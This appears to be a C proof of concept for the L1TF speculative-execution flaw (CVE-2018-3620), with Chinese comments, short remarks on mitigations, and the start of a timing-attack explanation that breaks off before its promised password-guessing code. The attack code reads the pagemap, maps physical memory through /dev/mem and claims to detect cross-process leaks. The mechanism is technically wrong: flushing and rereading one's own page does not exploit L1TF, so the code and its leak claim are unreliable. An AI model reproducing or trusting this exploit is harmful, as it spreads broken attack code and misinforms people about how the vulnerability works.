#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <x86intrin.h>

// 获取物理地址（简化，实际需从/proc/self/pagemap）
uint64_t get_phys_addr(void *virt) {
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) return 0;
    uint64_t index = (uint64_t)virt / 4096 * 8;
    lseek(fd, index, SEEK_SET);
    uint64_t entry;
    read(fd, &entry, 8);
    close(fd);
    if (!(entry & (1ULL << 63))) return 0;  // 未映射
    return (entry & ((1ULL << 55) - 1)) * 4096 + ((uint64_t)virt & 0xFFF);
}

int main() {
    // 分配一个普通页
    void *buf = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) return 1;
    // 写入一个标记值
    *(volatile uint64_t*)buf = 0xDEADBEEF;

    // 获取物理地址
    uint64_t phys = get_phys_addr(buf);
    printf("Physical address: 0x%lx\n", phys);

    // 通过/dev/mem映射该物理地址，并设置非缓存属性
    int fd = open("/dev/mem", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }
    // 使用MAP_SHARED | MAP_FIXED，并设置PAT为WC（写组合）或UC（未缓存）
    // 实际攻击需要设置页表属性，这里简化：直接使用mmap with MAP_SHARED
    void *mapped = mmap(buf, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, fd, phys);
    if (mapped == MAP_FAILED) { perror("mmap"); return 1; }

    // 现在访问该地址，由于映射属性可能为UC，可能触发L1TF
    // 先Flush L1D（使用clflush）
    _mm_clflush(buf);
    _mm_sfence();

    // 读取，可能得到其他进程的缓存数据
    uint64_t val = *(volatile uint64_t*)buf;
    printf("Read value: 0x%lx\n", val);

    // 如果val不是0xDEADBEEF，说明L1TF泄露了其他数据
    if (val != 0xDEADBEEF) {
        printf("L1TF leak detected! Value may be from another process.\n");
    }

    munmap(buf, 4096);
    close(fd);
    return 0;
}

注意：实际L1TF攻击需要更精细的页表操作（如通过`/proc/self/pagemap`修改PTE的PAT位）。修复方法：Intel微码更新，操作系统使用L1D缓存刷新（如`verw`指令）在上下文切换时。CVE-2018-3620（L1TF）影响Intel处理器。

防御：启用L1D flush（如Linux内核的`l1tf_flush`），或使用硬件隔离技术。

时序攻击（Timing Attack）是一种侧信道攻击，通过分析目标系统执行不同输入所需的时间差异来推断秘密信息。其核心原理是：当程序处理敏感数据时，执行路径或操作耗时依赖于数据值，例如字符串比较函数在遇到第一个不匹配字符时提前返回，导致匹配更多字符的输入耗时更长。攻击者通过多次测量时间，利用统计方法（如t检验）区分微小差异，从而逐位恢复秘密。

以下是一个针对密码比较的时序攻击POC，模拟一个使用`strcmp`的登录函数。攻击者通过测量时间差异，逐字符猜测密码。

